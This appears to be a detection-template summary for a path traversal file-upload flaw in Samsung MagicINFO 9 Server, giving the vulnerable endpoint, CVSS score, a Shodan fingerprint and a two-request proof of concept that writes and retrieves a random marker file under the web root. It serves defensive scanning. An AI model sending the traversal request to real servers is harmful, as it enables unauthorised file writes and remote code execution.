## Vulnerability
Improper limitation of a pathname to a restricted directory (CWE-22) in the file upload endpoint of Samsung MagicINFO 9 Server before version 21.1052. Unauthenticated attackers can perform path traversal via the `fileName` parameter in `/MagicInfo/servlet/SWUpdateFileUploader`, writing arbitrary files with SYSTEM authority and achieving remote code execution. CVSS 3.1 score 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). Shodan fingerprint: "Server: magicinfo premium server".

## PoC / Detection
Classification: rce

The template executes a two-request flow that directly demonstrates the RCE impact:  
1. POST `/MagicInfo/servlet/SWUpdateFileUploader?fileName=./../../../../../../server/{{rand_text_alpha(6)}}.html&deviceType={{rand_text_alpha(6)}}&deviceModelName={{rand_text_alpha(6)}}&swVer={{rand_int(100,999)}}` with `Content-Type: text/plain` and a random 12-character marker as body; matcher confirms status 200 and `Server: MagicInfo Premium Server`.  
2. GET `/MagicInfo/{{filename}}.html`; matcher confirms the uploaded marker is returned in the body with status 200.  
Successful retrieval proves arbitrary file write under the web root with SYSTEM privileges, confirming exploitable RCE.
